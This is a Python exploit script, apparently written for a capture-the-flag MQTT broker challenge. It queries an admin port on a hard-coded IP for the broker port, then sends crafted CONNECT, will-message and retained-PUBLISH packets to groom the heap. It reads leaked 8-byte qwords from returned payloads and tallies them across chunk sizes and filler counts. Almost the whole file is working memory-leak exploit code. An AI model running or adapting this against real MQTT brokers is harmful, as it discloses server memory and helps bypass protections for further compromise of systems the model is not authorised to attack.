#!/usr/bin/env python3
import re
import socket
import struct
import time
import binascii
from collections import Counter
TARGET_IP = "3.38.189.48"
ADMIN_PORT = 33686
def enc_varint(x):
    out = b""
    while True:
        d = x % 128
        x //= 128
        if x:
            d |= 0x80
        out += bytes([d])
        if not x:
            return out
def build_connect(cid, will_topic=None, will_payload=None):
    flags = 0x02
    payload = struct.pack(">H", len(cid)) + cid
    if will_topic is not None:
        flags |= 0x04
        payload += struct.pack(">H", len(will_topic)) + will_topic
        payload += struct.pack(">H", len(will_payload)) + will_payload
    vh = b"\x00\x04MQTT\x04" + bytes([flags]) + b"\x00\x3c"
    return b"\x10" + enc_varint(len(vh) + len(payload)) + vh + payload
def build_publish(topic, payload, retain=True):
    hdr = 0x31 if retain else 0x30
    vh = struct.pack(">H", len(topic)) + topic
    return bytes([hdr]) + enc_varint(len(vh) + len(payload)) + vh + payload
def build_sub_all(pid=1):
    payload = struct.pack(">H", pid) + struct.pack(">H", 1) + b"#" + b"\x00"
    return b"\x82" + enc_varint(len(payload)) + payload
def recv_all(sock, timeout=0.5):
    sock.settimeout(timeout)
    out = b""
    while True:
        try:
            chunk = sock.recv(65535)
            if not chunk:
                break
            out += chunk
        except Exception:
            break
    return out
def parse_publishes(buf):
    i = 0
    msgs = []
    while i < len(buf):
        if i + 2 > len(buf):
            break
        hdr = buf[i]
        i += 1
        mult = 1
        rem = 0
        while True:
            if i >= len(buf):
                return msgs
            b = buf[i]
            i += 1
            rem += (b & 0x7F) * mult
            if not (b & 0x80):
                break
            mult *= 128
        body = buf[i:i + rem]
        i += rem
        if hdr >> 4 == 3 and len(body) >= 2:
            tlen = struct.unpack(">H", body[:2])[0]
            topic = body[2:2 + tlen]
            payload = body[2 + tlen:]
            msgs.append((topic, payload))
    return msgs
def get_broker_port():
    admin = socket.create_connection((TARGET_IP, ADMIN_PORT), timeout=5)
    banner = b""
    while b"Type 'help'" not in banner:
        banner += admin.recv(4096)
    m = re.search(rb"Broker port : (\d+)", banner)
    if not m:
        raise RuntimeError("failed to parse broker port")
    return admin, int(m.group(1)), banner
def single_leak(chunk_size, filler_count=0):
    admin, broker_port, banner = get_broker_port()
    sub = socket.create_connection((TARGET_IP, broker_port), timeout=5)
    sub.sendall(build_connect(b"sub"))
    time.sleep(0.05)
    recv_all(sub)
    sub.sendall(build_sub_all())
    time.sleep(0.05)
    recv_all(sub)
    c1 = socket.create_connection((TARGET_IP, broker_port), timeout=5)
    c1.sendall(build_connect(b"c1"))
    time.sleep(0.05)
    recv_all(c1)
    fillers = []
    for i in range(filler_count):
        cid = f"f{i}".encode()
        payload = bytes([0x41 + (i % 26)]) * chunk_size
        fx = socket.create_connection((TARGET_IP, broker_port), timeout=5)
        fx.sendall(build_connect(cid, will_topic=b"w", will_payload=payload))
        time.sleep(0.02)
        recv_all(fx)
        fillers.append(fx)
    c1.sendall(build_publish(b"a", b"A" * chunk_size, retain=True))
    time.sleep(0.05)
    c1.sendall(build_publish(b"a", b"", retain=True))
    time.sleep(0.05)
    c2 = socket.create_connection((TARGET_IP, broker_port), timeout=5)
    c2.sendall(build_connect(b"c2", will_topic=b"w", will_payload=b"W" * chunk_size))
    time.sleep(0.05)
    recv_all(c2)
    c1.sendall(build_publish(b"b", b"B" * chunk_size, retain=True))
    time.sleep(0.10)
    c2.close()
    time.sleep(0.20)
    raw = recv_all(sub, 1.0)
    leaks = []
    for topic, payload in parse_publishes(raw):
        if topic == b"b" and len(payload) >= 8:
            q = struct.unpack("<Q", payload[:8])[0]
            leaks.append((q, payload[:32]))
    for fx in fillers:
        try:
            fx.close()
        except Exception:
            pass
    for s in (sub, c1, admin):
        try:
            s.close()
        except Exception:
            pass
    return leaks, raw, banner
def main():
    sizes = [0x20, 0x30, 0x110, 0x190, 0x390]
    filler_states = [0, 1, 2, 3, 5]
    rounds = 3
    all_results = []
    for size in sizes:
        for fillers in filler_states:
            for r in range(rounds):
                try:
                    leaks, raw, banner = single_leak(size, fillers)
                    if not leaks:
                        print(f"size={size:#x} fillers={fillers} round={r} leak=None")
                        continue
                    for q, first32 in leaks:
                        print(
                            f"size={size:#x} fillers={fillers} round={r} "
                            f"qword={q:#018x} first32={binascii.hexlify(first32).decode()}"
                        )
                        all_results.append((size, fillers, q, first32))
                except Exception as e:
                    print(f"size={size:#x} fillers={fillers} round={r} error={e}")
    print("\n=== grouped ===")
    grouped = {}
    for size, fillers, q, first32 in all_results:
        grouped.setdefault((size, fillers), []).append(q)
    for key, vals in grouped.items():
        c = Counter(vals)
        print(f"{key}:")
        for q, n in c.most_common():
            print(f"  {q:#018x} x{n}")
if __name__ == "__main__":
    main()
